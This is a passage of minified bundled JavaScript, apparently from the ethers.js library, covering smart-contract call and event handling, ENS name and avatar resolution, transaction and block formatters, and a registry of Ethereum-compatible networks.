WeakMap;class S7 extends X9{constructor(r,n,i,s){super(r,n,i);j(this,"log");Ce(this,{log:s})}async getBlock(){return await this.log.getBlock()}async getTransaction(){return await this.log.getTransaction()}async getTransactionReceipt(){return await this.log.getTransactionReceipt()}}class nre extends S7{constructor(e,r,n,i,s){super(e,r,n,new j2(s,e.interface,i));const o=e.interface.decodeEventLog(i,this.log.data,this.log.topics);Ce(this,{args:o,fragment:i})}get eventName(){return this.fragment.name}get eventSignature(){return this.fragment.format()}}const B6=BigInt(0);function N7(t){return t&&typeof t.call=="function"}function P7(t){return t&&typeof t.estimateGas=="function"}function N1(t){return t&&typeof t.resolveName=="function"}function k7(t){return t&&typeof t.sendTransaction=="function"}function O7(t){if(t!=null){if(N1(t))return t;if(t.provider)return t.provider}}var Tf;class ire{constructor(e,r,n){H(this,Tf);j(this,"fragment");if(Ce(this,{fragment:r}),r.inputs.length<n.length)throw new Error("too many arguments");const i=Rc(e.runner,"resolveName"),s=N1(i)?i:null;$(this,Tf,async function(){const o=await Promise.all(r.inputs.map((a,c)=>n[c]==null?null:a.walkAsync(n[c],(u,h)=>u==="address"?Array.isArray(h)?Promise.all(h.map(d=>Nr(d,s))):Nr(h,s):h)));return e.interface.encodeFilterTopics(r,o)}())}getTopicFilter(){return A(this,Tf)}}Tf=new WeakMap;function Rc(t,e){return t==null?null:typeof t[e]=="function"?t:t.provider&&typeof t.provider[e]=="function"?t.provider:null}function Ma(t){return t==null?null:t.provider||null}async function _7(t,e){const r=mr.dereference(t,"overrides");M(typeof r=="object","invalid overrides parameter","overrides",t);const n=Pg(r);return M(n.to==null||(e||[]).indexOf("to")>=0,"cannot override to","overrides.to",n.to),M(n.data==null||(e||[]).indexOf("data")>=0,"cannot override data","overrides.data",n.data),n.from&&(n.from=n.from),n}async function sre(t,e,r){const n=Rc(t,"resolveName"),i=N1(n)?n:null;return await Promise.all(e.map((s,o)=>s.walkAsync(r[o],(a,c)=>(c=mr.dereference(c,a),a==="address"?Nr(c,i):c))))}function ore(t){const e=async function(o){const a=await _7(o,["data"]);a.to=await t.getAddress(),a.from&&(a.from=await Nr(a.from,O7(t.runner)));const c=t.interface,l=ge(a.value||B6,"overrides.value")===B6,u=(a.data||"0x")==="0x";c.fallback&&!c.fallback.payable&&c.receive&&!u&&!l&&M(!1,"cannot send data to receive or send value to non-payable fallback","overrides",o),M(c.fallback||u,"cannot send data to receive-only contract","overrides.data",a.data);const h=c.receive||c.fallback&&c.fallback.payable;return M(h||l,"cannot send value to non-payable fallback","overrides.value",a.value),M(c.fallback||u,"cannot send data to receive-only contract","overrides.data",a.data),a},r=async function(o){const a=Rc(t.runner,"call");K(N7(a),"contract runner does not support calling","UNSUPPORTED_OPERATION",{operation:"call"});const c=await e(o);try{return await a.call(c)}catch(l){throw I2(l)&&l.data?t.interface.makeError(l.data,c):l}},n=async function(o){const a=t.runner;K(k7(a),"contract runner does not support sending transactions","UNSUPPORTED_OPERATION",{operation:"sendTransaction"});const c=await a.sendTransaction(await e(o)),l=Ma(t.runner);return new H2(t.interface,l,c)},i=async function(o){const a=Rc(t.runner,"estimateGas");return K(P7(a),"contract runner does not support gas estimation","UNSUPPORTED_OPERATION",{operation:"estimateGas"}),await a.estimateGas(await e(o))},s=async o=>await n(o);return Ce(s,{_contract:t,estimateGas:i,populateTransaction:e,send:n,staticCall:r}),s}function are(t,e){const r=function(...l){const u=t.interface.getFunction(e,l);return K(u,"no matching fragment","UNSUPPORTED_OPERATION",{operation:"fragment",info:{key:e,args:l}}),u},n=async function(...l){const u=r(...l);let h={};if(u.inputs.length+1===l.length&&(h=await _7(l.pop()),h.from&&(h.from=await Nr(h.from,O7(t.runner)))),u.inputs.length!==l.length)throw new Error("internal error: fragment inputs doesn't match arguments; should not happen");const d=await sre(t.runner,u.inputs,l);return Object.assign({},h,await Ar({to:t.getAddress(),data:t.interface.encodeFunctionData(u,d)}))},i=async function(...l){const u=await a(...l);return u.length===1?u[0]:u},s=async function(...l){const u=t.runner;K(k7(u),"contract runner does not support sending transactions","UNSUPPORTED_OPERATION",{operation:"sendTransaction"});const h=await u.sendTransaction(await n(...l)),d=Ma(t.runner);return new H2(t.interface,d,h)},o=async function(...l){const u=Rc(t.runner,"estimateGas");return K(P7(u),"contract runner does not support gas estimation","UNSUPPORTED_OPERATION",{operation:"estimateGas"}),await u.estimateGas(await n(...l))},a=async function(...l){const u=Rc(t.runner,"call");K(N7(u),"contract runner does not support calling","UNSUPPORTED_OPERATION",{operation:"call"});const h=await n(...l);let d="0x";try{d=await u.call(h)}catch(g){throw I2(g)&&g.data?t.interface.makeError(g.data,h):g}const f=r(...l);return t.interface.decodeFunctionResult(f,d)},c=async(...l)=>r(...l).constant?await i(...l):await s(...l);return Ce(c,{name:t.interface.getFunctionName(e),_contract:t,_key:e,getFragment:r,estimateGas:o,populateTransaction:n,send:s,staticCall:i,staticCallResult:a}),Object.defineProperty(c,"fragment",{configurable:!1,enumerable:!0,get:()=>{const l=t.interface.getFunction(e);return K(l,"no matching fragment","UNSUPPORTED_OPERATION",{operation:"fragment",info:{key:e}}),l}}),c}function cre(t,e){const r=function(...i){const s=t.interface.getEvent(e,i);return K(s,"no matching fragment","UNSUPPORTED_OPERATION",{operation:"fragment",info:{key:e,args:i}}),s},n=function(...i){return new ire(t,r(...i),i)};return Ce(n,{name:t.interface.getEventName(e),_contract:t,_key:e,getFragment:r}),Object.defineProperty(n,"fragment",{configurable:!1,enumerable:!0,get:()=>{const i=t.interface.getEvent(e);return K(i,"no matching fragment","UNSUPPORTED_OPERATION",{operation:"fragment",info:{key:e}}),i}}),n}const kg=Symbol.for("_ethersInternal_contract"),T7=new WeakMap;function lre(t,e){T7.set(t[kg],e)}function an(t){return T7.get(t[kg])}function ure(t){return t&&typeof t=="object"&&"getTopicFilter"in t&&typeof t.getTopicFilter=="function"&&t.fragment}async function q2(t,e){let r,n=null;if(Array.isArray(e)){const s=function(o){if(gt(o,32))return o;const a=t.interface.getEvent(o);return M(a,"unknown fragment","name",o),a.topicHash};r=e.map(o=>o==null?null:Array.isArray(o)?o.map(s):s(o))}else e==="*"?r=[null]:typeof e=="string"?gt(e,32)?r=[e]:(n=t.interface.getEvent(e),M(n,"unknown fragment","event",e),r=[n.topicHash]):ure(e)?r=await e.getTopicFilter():"fragment"in e?(n=e.fragment,r=[n.topicHash]):M(!1,"unknown event name","event",e);r=r.map(s=>{if(s==null)return null;if(Array.isArray(s)){const o=Array.from(new Set(s.map(a=>a.toLowerCase())).values());return o.length===1?o[0]:(o.sort(),o)}return s.toLowerCase()});const i=r.map(s=>s==null?"null":Array.isArray(s)?s.join("|"):s).join("&");return{fragment:n,tag:i,topics:r}}async function wd(t,e){const{subs:r}=an(t);return r.get((await q2(t,e)).tag)||null}async function L6(t,e,r){const n=Ma(t.runner);K(n,"contract runner does not support subscribing","UNSUPPORTED_OPERATION",{operation:e});const{fragment:i,tag:s,topics:o}=await q2(t,r),{addr:a,subs:c}=an(t);let l=c.get(s);if(!l){const h={address:a||t,topics:o},d=w=>{let m=i;if(m==null)try{m=t.interface.getEvent(w.topics[0])}catch{}if(m){const b=m,v=i?t.interface.decodeEventLog(i,w.data,w.topics):[];yb(t,r,v,x=>new nre(t,x,r,b,w))}else yb(t,r,[],b=>new S7(t,b,r,w))};let f=[];l={tag:s,listeners:[],start:()=>{f.length||f.push(n.on(h,d))},stop:async()=>{if(f.length==0)return;let w=f;f=[],await Promise.all(w),n.off(h,d)}},c.set(s,l)}return l}let mb=Promise.resolve();async function hre(t,e,r,n){await mb;const i=await wd(t,e);if(!i)return!1;const s=i.listeners.length;return i.listeners=i.listeners.filter(({listener:o,once:a})=>{const c=Array.from(r);n&&c.push(n(a?null:o));try{o.call(t,...c)}catch{}return!a}),i.listeners.length===0&&(i.stop(),an(t).subs.delete(i.tag)),s>0}async function yb(t,e,r,n){try{await mb}catch{}const i=hre(t,e,r,n);return mb=i,await i}const S0=["then"];var K6;K6=kg;const _d=class _d{constructor(e,r,n,i){j(this,"target");j(this,"interface");j(this,"runner");j(this,"filters");j(this,K6);j(this,"fallback");M(typeof e=="string"||Ux(e),"invalid value for Contract target","target",e),n==null&&(n=null);const s=wb.from(r);Ce(this,{target:e,runner:n,interface:s}),Object.defineProperty(this,kg,{value:{}});let o,a=null,c=null;if(i){const h=Ma(n);c=new H2(this.interface,h,i)}let l=new Map;if(typeof e=="string")if(gt(e))a=e,o=Promise.resolve(e);else{const h=Rc(n,"resolveName");if(!N1(h))throw Et("contract runner does not support name resolution","UNSUPPORTED_OPERATION",{operation:"resolveName"});o=h.resolveName(e).then(d=>{if(d==null)throw Et("an ENS name used for a contract target must be correctly configured","UNCONFIGURED_NAME",{value:e});return an(this).addr=d,d})}else o=e.getAddress().then(h=>{if(h==null)throw new Error("TODO");return an(this).addr=h,h});lre(this,{addrPromise:o,addr:a,deployTx:c,subs:l});const u=new Proxy({},{get:(h,d,f)=>{if(typeof d=="symbol"||S0.indexOf(d)>=0)return Reflect.get(h,d,f);try{return this.getEvent(d)}catch(g){if(!or(g,"INVALID_ARGUMENT")||g.argument!=="key")throw g}},has:(h,d)=>S0.indexOf(d)>=0?Reflect.has(h,d):Reflect.has(h,d)||this.interface.hasEvent(String(d))});return Ce(this,{filters:u}),Ce(this,{fallback:s.receive||s.fallback?ore(this):null}),new Proxy(this,{get:(h,d,f)=>{if(typeof d=="symbol"||d in h||S0.indexOf(d)>=0)return Reflect.get(h,d,f);try{return h.getFunction(d)}catch(g){if(!or(g,"INVALID_ARGUMENT")||g.argument!=="key")throw g}},has:(h,d)=>typeof d=="symbol"||d in h||S0.indexOf(d)>=0?Reflect.has(h,d):h.interface.hasFunction(d)})}connect(e){return new _d(this.target,this.interface,e)}attach(e){return new _d(e,this.interface,this.runner)}async getAddress(){return await an(this).addrPromise}async getDeployedCode(){const e=Ma(this.runner);K(e,"runner does not support .provider","UNSUPPORTED_OPERATION",{operation:"getDeployedCode"});const r=await e.getCode(await this.getAddress());return r==="0x"?null:r}async waitForDeployment(){const e=this.deploymentTransaction();if(e)return await e.wait(),this;if(await this.getDeployedCode()!=null)return this;const n=Ma(this.runner);return K(n!=null,"contract runner does not support .provider","UNSUPPORTED_OPERATION",{operation:"waitForDeployment"}),new Promise((i,s)=>{const o=async()=>{try{if(await this.getDeployedCode()!=null)return i(this);n.once("block",o)}catch(a){s(a)}};o()})}deploymentTransaction(){return an(this).deployTx}getFunction(e){return typeof e!="string"&&(e=e.format()),are(this,e)}getEvent(e){return typeof e!="string"&&(e=e.format()),cre(this,e)}async queryTransaction(e){throw new Error("@TODO")}async queryFilter(e,r,n){r==null&&(r=0),n==null&&(n="latest");const{addr:i,addrPromise:s}=an(this),o=i||await s,{fragment:a,topics:c}=await q2(this,e),l={address:o,topics:c,fromBlock:r,toBlock:n},u=Ma(this.runner);return K(u,"contract runner does not have a provider","UNSUPPORTED_OPERATION",{operation:"queryFilter"}),(await u.getLogs(l)).map(h=>{let d=a;if(d==null)try{d=this.interface.getEvent(h.topics[0])}catch{}if(d)try{return new j2(h,this.interface,d)}catch(f){return new I7(h,f)}return new cp(h,u)})}async on(e,r){const n=await L6(this,"on",e);return n.listeners.push({listener:r,once:!1}),n.start(),this}async once(e,r){const n=await L6(this,"once",e);return n.listeners.push({listener:r,once:!0}),n.start(),this}async emit(e,...r){return await yb(this,e,r,null)}async listenerCount(e){if(e){const i=await wd(this,e);return i?i.listeners.length:0}const{subs:r}=an(this);let n=0;for(const{listeners:i}of r.values())n+=i.length;return n}async listeners(e){if(e){const i=await wd(this,e);return i?i.listeners.map(({listener:s})=>s):[]}const{subs:r}=an(this);let n=[];for(const{listeners:i}of r.values())n=n.concat(i.map(({listener:s})=>s));return n}async off(e,r){const n=await wd(this,e);if(!n)return this;if(r){const i=n.listeners.map(({listener:s})=>s).indexOf(r);i>=0&&n.listeners.splice(i,1)}return(r==null||n.listeners.length===0)&&(n.stop(),an(this).subs.delete(n.tag)),this}async removeAllListeners(e){if(e){const r=await wd(this,e);if(!r)return this;r.stop(),an(this).subs.delete(r.tag)}else{const{subs:r}=an(this);for(const{tag:n,stop:i}of r.values())i(),r.delete(n)}return this}async addListener(e,r){return await this.on(e,r)}async removeListener(e,r){return await this.off(e,r)}static buildClass(e){class r extends _d{constructor(i,s=null){super(i,e,s)}}return r}static from(e,r,n){return n==null&&(n=null),new this(e,r,n)}};let bb=_d;function dre(){return bb}class gc extends dre(){}function $m(t){return t.match(/^ipfs:\/\/ipfs\//i)?t=t.substring(12):t.match(/^ipfs:\/\//i)?t=t.substring(7):M(!1,"unsupported IPFS format","link",t),`https://gateway.ipfs.io/ipfs/${t}`}class fre{constructor(e){j(this,"name");Ce(this,{name:e})}connect(e){return this}supportsCoinType(e){return!1}async encodeAddress(e,r){throw new Error("unsupported coin")}async decodeAddress(e,r){throw new Error("unsupported coin")}}const $7=new RegExp("^(ipfs)://(.*)$","i"),U6=[new RegExp("^(https)://(.*)$","i"),new RegExp("^(data):(.*)$","i"),$7,new RegExp("^eip155:[0-9]+/(erc[0-9]+):(.*)$","i")];var Co,Ya,Ao,Tl,Bg,R7;const zl=class zl{constructor(e,r,n){H(this,Ao);j(this,"provider");j(this,"address");j(this,"name");H(this,Co);H(this,Ya);Ce(this,{provider:e,address:r,name:n}),$(this,Co,null),$(this,Ya,new gc(r,["function supportsInterface(bytes4) view returns (bool)","function resolve(bytes, bytes) view returns (bytes)","function addr(bytes32) view returns (address)","function addr(bytes32, uint) view returns (bytes)","function text(bytes32, string) view returns (string)","function contenthash(bytes32) view returns (bytes)"],e))}async supportsWildcard(){return A(this,Co)==null&&$(this,Co,(async()=>{try{return await A(this,Ya).supportsInterface("0x9061b923")}catch(e){if(or(e,"CALL_EXCEPTION"))return!1;throw $(this,Co,null),e}})()),await A(this,Co)}async getAddress(e){if(e==null&&(e=60),e===60)try{const s=await Q(this,Ao,Tl).call(this,"addr(bytes32)");return s==null||s===wf?null:s}catch(s){if(or(s,"CALL_EXCEPTION"))return null;throw s}if(e>=0&&e<2147483648){let s=e+2147483648;const o=await Q(this,Ao,Tl).call(this,"addr(bytes32,uint)",[s]);if(gt(o,20))return ot(o)}let r=null;for(const s of this.provider.plugins)if(s instanceof fre&&s.supportsCoinType(e)){r=s;break}if(r==null)return null;const n=await Q(this,Ao,Tl).call(this,"addr(bytes32,uint)",[e]);if(n==null||n==="0x")return null;const i=await r.decodeAddress(e,n);if(i!=null)return i;K(!1,"invalid coin data","UNSUPPORTED_OPERATION",{operation:`getAddress(${e})`,info:{coinType:e,data:n}})}async getText(e){const r=await Q(this,Ao,Tl).call(this,"text(bytes32,string)",[e]);return r==null||r==="0x"?null:r}async getContentHash(){const e=await Q(this,Ao,Tl).call(this,"contenthash(bytes32)");if(e==null||e==="0x")return null;const r=e.match(/^0x(e3010170|e5010172)(([0-9a-f][0-9a-f])([0-9a-f][0-9a-f])([0-9a-f]*))$/);if(r){const i=r[1]==="e3010170"?"ipfs":"ipns",s=parseInt(r[4],16);if(r[5].length===s*2)return`${i}://${EY("0x"+r[2])}`}const n=e.match(/^0xe40101fa011b20([0-9a-f]*)$/);if(n&&n[1].length===64)return`bzz://${n[1]}`;K(!1,"invalid or unsupported content hash data","UNSUPPORTED_OPERATION",{operation:"getContentHash()",info:{data:e}})}async getAvatar(){return(await this._getAvatar()).url}async _getAvatar(){const e=[{type:"name",value:this.name}];try{const r=await this.getText("avatar");if(r==null)return e.push({type:"!avatar",value:""}),{url:null,linkage:e};e.push({type:"avatar",value:r});for(let n=0;n<U6.length;n++){const i=r.match(U6[n]);if(i==null)continue;const s=i[1].toLowerCase();switch(s){case"https":case"data":return e.push({type:"url",value:r}),{linkage:e,url:r};case"ipfs":{const o=$m(r);return e.push({type:"ipfs",value:r}),e.push({type:"url",value:o}),{linkage:e,url:o}}case"erc721":case"erc1155":{const o=s==="erc721"?"tokenURI(uint256)":"uri(uint256)";e.push({type:s,value:r});const a=await this.getAddress();if(a==null)return e.push({type:"!owner",value:""}),{url:null,linkage:e};const c=(i[2]||"").split("/");if(c.length!==2)return e.push({type:`!${s}caip`,value:i[2]||""}),{url:null,linkage:e};const l=c[1],u=new gc(c[0],["function tokenURI(uint) view returns (string)","function ownerOf(uint) view returns (address)","function uri(uint) view returns (string)","function balanceOf(address, uint256) view returns (uint)"],this.provider);if(s==="erc721"){const p=await u.ownerOf(l);if(a!==p)return e.push({type:"!owner",value:p}),{url:null,linkage:e};e.push({type:"owner",value:p})}else if(s==="erc1155"){const p=await u.balanceOf(a,l);if(!p)return e.push({type:"!balance",value:"0"}),{url:null,linkage:e};e.push({type:"balance",value:p.toString()})}let h=await u[o](l);if(h==null||h==="0x")return e.push({type:"!metadata-url",value:""}),{url:null,linkage:e};e.push({type:"metadata-url-base",value:h}),s==="erc1155"&&(h=h.replace("{id}",qo(l,32).substring(2)),e.push({type:"metadata-url-expanded",value:h})),h.match(/^ipfs:/i)&&(h=$m(h)),e.push({type:"metadata-url",value:h});let d={};const f=await new Vo(h).send();f.assertOk();try{d=f.bodyJson}catch{try{e.push({type:"!metadata",value:f.bodyText})}catch{const m=f.body;return m&&e.push({type:"!metadata",value:ue(m)}),{url:null,linkage:e}}return{url:null,linkage:e}}if(!d)return e.push({type:"!metadata",value:""}),{url:null,linkage:e};e.push({type:"metadata",value:JSON.stringify(d)});let g=d.image;if(typeof g!="string")return e.push({type:"!imageUrl",value:""}),{url:null,linkage:e};if(!g.match(/^(https:\/\/|data:)/i)){if(g.match($7)==null)return e.push({type:"!imageUrl-ipfs",value:g}),{url:null,linkage:e};e.push({type:"imageUrl-ipfs",value:g}),g=$m(g)}return e.push({type:"url",value:g}),{linkage:e,url:g}}}}}catch{}return{linkage:e,url:null}}static async getEnsAddress(e){const r=await e.getNetwork(),n=r.getPlugin("org.ethers.plugins.network.Ens");return K(n,"network does not support ENS","UNSUPPORTED_OPERATION",{operation:"getEnsAddress",info:{network:r}}),n.address}static async fromName(e,r){var i;let n=r;for(;;){if(n===""||n==="."||r!=="eth"&&n==="eth")return null;const s=await Q(i=zl,Bg,R7).call(i,e,n);if(s!=null){const o=new zl(e,s,r);return n!==r&&!await o.supportsWildcard()?null:o}n=n.split(".").slice(1).join(".")}}};Co=new WeakMap,Ya=new WeakMap,Ao=new WeakSet,Tl=async function(e,r){r=(r||[]).slice();const n=A(this,Ya).interface;r.unshift(pb(this.name));let i=null;await this.supportsWildcard()&&(i=n.getFunction(e),K(i,"missing fragment","UNKNOWN_ERROR",{info:{funcName:e}}),r=[dte(this.name,255),n.encodeFunctionData(i,r)],e="resolve(bytes,bytes)"),r.push({enableCcipRead:!0});try{const s=await A(this,Ya)[e](...r);return i?n.decodeFunctionResult(i,s)[0]:s}catch(s){if(!or(s,"CALL_EXCEPTION"))throw s}return null},Bg=new WeakSet,R7=async function(e,r){const n=await zl.getEnsAddress(e);try{const s=await new gc(n,["function resolver(bytes32) view returns (address)"],e).resolver(pb(r),{enableCcipRead:!0});return s===wf?null:s}catch(i){throw i}return null},H(zl,Bg);let Og=zl;const M6=BigInt(0);function He(t,e){return function(r){return r==null?e:t(r)}}function P1(t,e){return r=>{if(e&&r==null)return null;if(!Array.isArray(r))throw new Error("not an array");return r.map(n=>t(n))}}function lp(t,e){return r=>{const n={};for(const i in t){let s=i;if(e&&i in e&&!(s in r)){for(const o of e[i])if(o in r){s=o;break}}try{const o=t[i](r[s]);o!==void 0&&(n[i]=o)}catch(o){const a=o instanceof Error?o.message:"not-an-error";K(!1,`invalid value for value.${i} (${a})`,"BAD_DATA",{value:r})}}return n}}function pre(t){switch(t){case!0:case"true":return!0;case!1:case"false":return!1}M(!1,`invalid boolean; ${JSON.stringify(t)}`,"value",t)}function sh(t){return M(gt(t,!0),"invalid data","value",t),t}function sr(t){return M(gt(t,32),"invalid hash","value",t),t}const gre=lp({address:ot,blockHash:sr,blockNumber:Re,data:sh,index:Re,removed:He(pre,!1),topics:P1(sr),transactionHash:sr,transactionIndex:Re},{index:["logIndex"]});function wre(t){return gre(t)}const mre=lp({hash:He(sr),parentHash:sr,parentBeaconBlockRoot:He(sr,null),number:Re,timestamp:Re,nonce:He(sh),difficulty:ge,gasLimit:ge,gasUsed:ge,stateRoot:He(sr,null),receiptsRoot:He(sr,null),blobGasUsed:He(ge,null),excessBlobGas:He(ge,null),miner:He(ot),prevRandao:He(sr,null),extraData:sh,baseFeePerGas:He(ge)},{prevRandao:["mixHash"]});function yre(t){const e=mre(t);return e.transactions=t.transactions.map(r=>typeof r=="string"?r:D7(r)),e}const bre=lp({transactionIndex:Re,blockNumber:Re,transactionHash:sr,address:ot,topics:P1(sr),data:sh,index:Re,blockHash:sr},{index:["logIndex"]});function vre(t){return bre(t)}const Ere=lp({to:He(ot,null),from:He(ot,null),contractAddress:He(ot,null),index:Re,root:He(ue),gasUsed:ge,blobGasUsed:He(ge,null),logsBloom:He(sh),blockHash:sr,hash:sr,logs:P1(vre),blockNumber:Re,cumulativeGasUsed:ge,effectiveGasPrice:He(ge),blobGasPrice:He(ge,null),status:He(Re),type:He(Re,0)},{effectiveGasPrice:["gasPrice"],hash:["transactionHash"],index:["transactionIndex"]});function Cre(t){return Ere(t)}function D7(t){t.to&&ge(t.to)===M6&&(t.to="0x0000000000000000000000000000000000000000");const e=lp({hash:sr,index:He(Re,void 0),type:r=>r==="0x"||r==null?0:Re(r),accessList:He(Fc,null),blobVersionedHashes:He(P1(sr,!0),null),blockHash:He(sr,null),blockNumber:He(Re,null),transactionIndex:He(Re,null),from:ot,gasPrice:He(ge),maxPriorityFeePerGas:He(ge),maxFeePerGas:He(ge),maxFeePerBlobGas:He(ge,null),gasLimit:ge,to:He(ot,null),value:ge,nonce:Re,data:sh,creates:He(ot,null),chainId:He(ge,null)},{data:["input"],gasLimit:["gas"],index:["transactionIndex"]})(t);if(e.to==null&&e.creates==null&&(e.creates=gee(e)),(t.type===1||t.type===2)&&t.accessList==null&&(e.accessList=[]),t.signature?e.signature=fi.from(t.signature):e.signature=fi.from(t),e.chainId==null){const r=e.signature.legacyChainId;r!=null&&(e.chainId=r)}return e.blockHash&&ge(e.blockHash)===M6&&(e.blockHash=null),e}const Are="0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e";class up{constructor(e){j(this,"name");Ce(this,{name:e})}clone(){return new up(this.name)}}class k1 extends up{constructor(r,n){r==null&&(r=0);super(`org.ethers.network.plugins.GasCost#${r||0}`);j(this,"effectiveBlock");j(this,"txBase");j(this,"txCreate");j(this,"txDataZero");j(this,"txDataNonzero");j(this,"txAccessListStorageKey");j(this,"txAccessListAddress");const i={effectiveBlock:r};function s(o,a){let c=(n||{})[o];c==null&&(c=a),M(typeof c=="number",`invalud value for ${o}`,"costs",n),i[o]=c}s("txBase",21e3),s("txCreate",32e3),s("txDataZero",4),s("txDataNonzero",16),s("txAccessListStorageKey",1900),s("txAccessListAddress",2400),Ce(this,i)}clone(){return new k1(this.effectiveBlock,this)}}class O1 extends up{constructor(r,n){super("org.ethers.plugins.network.Ens");j(this,"address");j(this,"targetNetwork");Ce(this,{address:r||Are,targetNetwork:n??1})}clone(){return new O1(this.address,this.targetNetwork)}}var $f,Rf;class xre extends up{constructor(r,n){super("org.ethers.plugins.network.FetchUrlFeeDataPlugin");H(this,$f);H(this,Rf);$(this,$f,r),$(this,Rf,n)}get url(){return A(this,$f)}get processFunc(){return A(this,Rf)}clone(){return this}}$f=new WeakMap,Rf=new WeakMap;const Rm=new Map;var Cu,Au,xo;const jl=class jl{constructor(e,r){H(this,Cu);H(this,Au);H(this,xo);$(this,Cu,e),$(this,Au,ge(r)),$(this,xo,new Map)}toJSON(){return{name:this.name,chainId:String(this.chainId)}}get name(){return A(this,Cu)}set name(e){$(this,Cu,e)}get chainId(){return A(this,Au)}set chainId(e){$(this,Au,ge(e,"chainId"))}matches(e){if(e==null)return!1;if(typeof e=="string"){try{return this.chainId===ge(e)}catch{}return this.name===e}if(typeof e=="number"||typeof e=="bigint"){try{return this.chainId===ge(e)}catch{}return!1}if(typeof e=="object"){if(e.chainId!=null){try{return this.chainId===ge(e.chainId)}catch{}return!1}return e.name!=null?this.name===e.name:!1}return!1}get plugins(){return Array.from(A(this,xo).values())}attachPlugin(e){if(A(this,xo).get(e.name))throw new Error(`cannot replace existing plugin: ${e.name} `);return A(this,xo).set(e.name,e.clone()),this}getPlugin(e){return A(this,xo).get(e)||null}getPlugins(e){return this.plugins.filter(r=>r.name.split("#")[0]===e)}clone(){const e=new jl(this.name,this.chainId);return this.plugins.forEach(r=>{e.attachPlugin(r.clone())}),e}computeIntrinsicGas(e){const r=this.getPlugin("org.ethers.plugins.network.GasCost")||new k1;let n=r.txBase;if(e.to==null&&(n+=r.txCreate),e.data)for(let i=2;i<e.data.length;i+=2)e.data.substring(i,i+2)==="00"?n+=r.txDataZero:n+=r.txDataNonzero;if(e.accessList){const i=Fc(e.accessList);for(const s in i)n+=r.txAccessListAddress+r.txAccessListStorageKey*i[s].storageKeys.length}return n}static from(e){if(Ire(),e==null)return jl.from("mainnet");if(typeof e=="number"&&(e=BigInt(e)),typeof e=="string"||typeof e=="bigint"){const r=Rm.get(e);if(r)return r();if(typeof e=="bigint")return new jl("unknown",e);M(!1,"unknown network","network",e)}if(typeof e.clone=="function")return e.clone();if(typeof e=="object"){M(typeof e.name=="string"&&typeof e.chainId=="number","invalid network object name or chainId","network",e);const r=new jl(e.name,e.chainId);return(e.ensAddress||e.ensNetwork!=null)&&r.attachPlugin(new O1(e.ensAddress,e.ensNetwork)),r}M(!1,"invalid network","network",e)}static register(e,r){typeof e=="number"&&(e=BigInt(e));const n=Rm.get(e);n&&M(!1,`conflicting network for ${JSON.stringify(n.name)}`,"nameOrChainId",e),Rm.set(e,r)}};Cu=new WeakMap,Au=new WeakMap,xo=new WeakMap;let Vi=jl;function F6(t,e){const r=String(t);if(!r.match(/^[0-9.]+$/))throw new Error(`invalid gwei value: ${t}`);const n=r.split(".");if(n.length===1&&n.push(""),n.length!==2)throw new Error(`invalid gwei value: ${t}`);for(;n[1].length<e;)n[1]+="0";if(n[1].length>9){let i=BigInt(n[1].substring(0,9));n[1].substring(9).match(/^0+$/)||i++,n[1]=i.toString()}return BigInt(n[0]+n[1])}function z6(t){return new xre(t,async(e,r,n)=>{n.setHeader("User-Agent","ethers");let i;try{const[s,o]=await Promise.all([n.send(),e()]);i=s;const a=i.bodyJson.standard;return{gasPrice:o.gasPrice,maxFeePerGas:F6(a.maxFee,9),maxPriorityFeePerGas:F6(a.maxPriorityFee,9)}}catch(s){K(!1,`error encountered with polygon gas station (${JSON.stringify(n.url)})`,"SERVER_ERROR",{request:n,response:i,error:s})}})}let j6=!1;function Ire(){if(j6)return;j6=!0;function t(e,r,n){const i=function(){const s=new Vi(e,r);return n.ensNetwork!=null&&s.attachPlugin(new O1(null,n.ensNetwork)),s.attachPlugin(new k1),(n.plugins||[]).forEach(o=>{s.attachPlugin(o)}),s};Vi.register(e,i),Vi.register(r,i),n.altNames&&n.altNames.forEach(s=>{Vi.register(s,i)})}t("mainnet",1,{ensNetwork:1,altNames:["homestead"]}),t("ropsten",3,{ensNetwork:3}),t("rinkeby",4,{ensNetwork:4}),t("goerli",5,{ensNetwork:5}),t("kovan",42,{ensNetwork:42}),t("sepolia",11155111,{ensNetwork:11155111}),t("holesky",17e3,{ensNetwork:17e3}),t("classic",61,{}),t("classicKotti",6,{}),t("arbitrum",42161,{ensNetwork:1}),t("arbitrum-goerli",421613,{}),t("arbitrum-sepolia",421614,{}),t("base",8453,{ensNetwork:1}),t("base-goerli",84531,{}),t("base-sepolia",84532,{}),t("bnb",56,{ensNetwork:1}),t("bnbt",97,{}),t("linea",59144,{ensNetwork:1}),t("linea-goerli",59140,{}),t("linea-sepolia",59141,{}),t("matic",137,{ensNetwork:1,plugins:[z6("https://gasstation.polygon.technology/v2")]}),t("matic-amoy",80002,{}),t("matic-mumbai",80001,{altNames:["maticMumbai","maticmum"],plugins:[z6("https://gasstation-testnet.polygon.technology/v2")]}),t("optimism",10,{ensNetwork:1,plugins:[]}),t("optimism-goerli",420,{}),t("optimism-sepolia",11155420,{}),t("xdai",100,{ensNetwork:1})}function vb(t){return JSON.parse(JSON.stringify(t))}var Ns,Dn,Io,Bi,xu,q0;class Sre{constructor(e){H(this,xu);H(this,Ns);H(this,Dn);H(this,Io);H(this,Bi);$(this,Ns,e),$(this,Dn,null),$(this,Io,4e3),$(this,Bi,-2)}get pollingInterval(){return A(this,Io)}set pollingInterval(e){$(this,Io,e)}start(){A(this,Dn)||($(this,Dn,A(this,Ns)._setTimeout(Q(this,xu,q0).bind(this),A(this,Io))),Q(this,xu,q0).call(this))}stop(){A(this,Dn)&&(A(this,Ns)._clearTimeout(A(this,Dn)),$(this,Dn,null))}pause(e){this.stop(),e&&$(this,Bi,-2)}resume(){this.start()}}Ns=new WeakMap,Dn=new WeakMap,Io=new WeakMap,Bi=new WeakMap,xu=new WeakSet,q0=async function(){try{const e=await A(this,Ns).getBlockNumber();if(A(this,Bi)===-2){$(this,Bi,e);return}if(e!==A(this,Bi)){for(let r=A(this,Bi)+1;r<=e;r++){if(A(this,Dn)==null)return;await A(this,Ns).emit("block",r)}$(this,Bi,e)}}catch{}A(this,Dn)!=null&&$(this,Dn,A(this,Ns)._setTimeout(Q(this,xu,q0).bind(this),A(this,Io)))};var Xa,ec,So;class V2{constructor(e){H(this,Xa);H(this,ec);H(this,So);$(this,Xa,e),$(this,So,!1),$(this,ec,r=>{this._poll(r,A(this,Xa))})}async _poll(e,r){throw new Error("sub-classes must override 